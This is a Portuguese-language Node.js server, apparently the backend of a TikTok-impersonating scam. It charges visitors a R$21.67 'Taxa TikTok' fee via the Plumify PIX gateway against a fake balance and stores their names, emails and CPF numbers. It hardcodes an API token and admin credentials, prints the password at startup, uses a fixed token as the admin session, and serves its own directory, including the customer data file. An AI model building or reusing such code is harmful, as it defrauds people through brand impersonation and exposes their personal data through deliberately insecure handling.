// server-all-in-one.js - TUDO EM UM SÓ
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== CONFIGURAÇÕES ==========
const CONFIG = {
    plumify: {
        token: '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa',
        accountId: '9kajnnbn2c',
        baseURL: 'https://api.plumify.com.br/api/public/v1',
        productHash: 'flnqw8vjsf'
    },
    admin: {
        username: 'admin',
        password: 'Admin@1234',
        secret: 'tiktok-secret-2024'
    }
};

// ========== BANCO DE DADOS SIMPLES ==========
const db = {
    payments: [],
    users: [],
    settings: {
        siteName: 'TikTok PIX',
        taxAmount: 21.67,
        mainBalance: 4596.72
    }
};

const DB_FILE = path.join(__dirname, 'data', 'db.json');

// Salvar banco
function saveDatabase() {
    if (!fs.existsSync(path.dirname(DB_FILE))) {
        fs.mkdirSync(path.dirname(DB_FILE), { recursive: true });
    }
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

// Carregar banco
if (fs.existsSync(DB_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        Object.assign(db, saved);
    } catch (err) {
        console.log('⚠️ Não foi possível carregar o banco:', err.message);
    }
}

// ========== MIDDLEWARES ==========
app.use(express.json());
app.use(express.static(__dirname));

// ========== ROTAS PÚBLICAS ==========
app.get('/', (req, res) => res.redirect('/pagamento'));
app.get('/pagamento', (req, res) => res.sendFile(__dirname + '/pagamento.html'));
app.get('/login.html', (req, res) => res.sendFile(__dirname + '/login.html'));
app.get('/admin.html', (req, res) => res.sendFile(__dirname + '/admin.html'));

// Health
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        service: 'TikTok PIX Complete',
        version: '2.0',
        stats: {
            payments: db.payments.length,
            users: db.users.length
        }
    });
});

// ========== API PIX ==========
app.post('/api/pix/create', async (req, res) => {
    console.log('🔄 Criando PIX...');
    
    try {
        const { customerName, customerEmail, customerCpf } = req.body;
        
        // Validação
        if (!customerName || !customerEmail || !customerCpf) {
            return res.status(400).json({
                success: false,
                error: 'Preencha todos os campos'
            });
        }
        
        const cpfClean = customerCpf.replace(/\D/g, '');
        if (cpfClean.length !== 11) {
            return res.status(400).json({
                success: false,
                error: 'CPF inválido'
            });
        }
        
        // Criar ID
        const paymentId = `PIX_${Date.now()}`;
        
        // Registrar no banco
        const payment = {
            id: paymentId,
            customerName: customerName.trim(),
            customerEmail: customerEmail.trim(),
            customerCpf: cpfClean,
            amount: 21.67,
            status: 'pending',
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString()
        };
        
        db.payments.push(payment);
        
        // Registrar usuário
        const userExists = db.users.find(u => u.cpf === cpfClean);
        if (!userExists) {
            db.users.push({
                id: `USER_${Date.now()}`,
                name: customerName.trim(),
                email: customerEmail.trim(),
                cpf: cpfClean,
                firstPayment: payment.createdAt,
                totalPayments: 1,
                totalSpent: 21.67
            });
        }
        
        saveDatabase();
        
        // Criar PIX na Plumify
        const payload = {
            api_token: CONFIG.plumify.token,
            amount: 2167,
            payment_method: "pix",
            customer: {
                name: customerName.trim(),
                email: customerEmail.trim(),
                phone_number: "61995512071",
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [{
                product_hash: CONFIG.plumify.productHash,
                title: "Taxa TikTok",
                price: 2167,
                quantity: 1,
                tangible: false,
                requires_shipping: false,
                operation_type: 1
            }],
            offer_hash: `tiktok_${Date.now()}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        const response = await axios.post(
            `${CONFIG.plumify.baseURL}/transactions`,
            payload,
            { headers: { 'Content-Type': 'application/json' }, timeout: 30000 }
        );
        
        const data = response.data;
        
        if (data.error) {
            payment.status = 'failed';
            payment.error = data.error;
            saveDatabase();
            
            return res.status(400).json({
                success: false,
                error: data.error.message
            });
        }
        
        // Atualizar com dados da Plumify
        payment.pixCode = data.pix?.pix_qr_code || data.qr_code || '';
        payment.pixUrl = data.pix?.pix_url || data.qr_code_image || 
                       `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(payment.pixCode)}`;
        payment.transactionId = data.id;
        
        saveDatabase();
        
        // Retornar resposta
        res.json({
            success: true,
            message: 'PIX gerado!',
            payment: {
                id: payment.id,
                amount: payment.amount,
                pixCode: payment.pixCode,
                pixUrl: payment.pixUrl,
                expiresAt: payment.expiresAt
            }
        });
        
    } catch (error) {
        console.error('❌ Erro:', error.message);
        res.status(500).json({
            success: false,
            error: 'Erro ao gerar PIX'
        });
    }
});

// ========== API ADMIN ==========
// Login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === CONFIG.admin.username && password === CONFIG.admin.password) {
        res.json({
            success: true,
            token: CONFIG.admin.secret,
            user: { username, role: 'admin' }
        });
    } else {
        res.status(401).json({
            success: false,
            error: 'Credenciais inválidas'
        });
    }
});

// Middleware de autenticação
function authMiddleware(req, res, next) {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (token === CONFIG.admin.secret) {
        next();
    } else {
        res.status(401).json({
            success: false,
            error: 'Não autorizado'
        });
    }
}

// Dashboard
app.get('/api/admin/dashboard', authMiddleware, (req, res) => {
    const total = db.payments.length;
    const paid = db.payments.filter(p => p.status === 'paid').length;
    const pending = db.payments.filter(p => p.status === 'pending').length;
    const revenue = db.payments
        .filter(p => p.status === 'paid')
        .reduce((sum, p) => sum + p.amount, 0);
    
    res.json({
        success: true,
        data: {
            stats: {
                totalPayments: total,
                paidPayments: paid,
                pendingPayments: pending,
                totalRevenue: revenue,
                totalUsers: db.users.length
            },
            recentPayments: db.payments.slice(-10).reverse(),
            settings: db.settings
        }
    });
});

// Listar pagamentos
app.get('/api/admin/payments', authMiddleware, (req, res) => {
    const { status } = req.query;
    let payments = db.payments;
    
    if (status && status !== 'all') {
        payments = payments.filter(p => p.status === status);
    }
    
    res.json({
        success: true,
        payments: payments.reverse(),
        total: db.payments.length
    });
});

// ========== INICIAR ==========
app.listen(PORT, () => {
    console.log(`
    🚀 TIKTOK PIX - TUDO EM UM
    ============================
    ✅ Porta: ${PORT}
    🌐 Site: /pagamento
    🔐 Admin: /admin.html
    👤 Login: /login.html
    📊 Pagamentos: ${db.payments.length}
    👥 Usuários: ${db.users.length}
    🔑 Credenciais: ${CONFIG.admin.username} / ${CONFIG.admin.password}
    ============================
    `);
});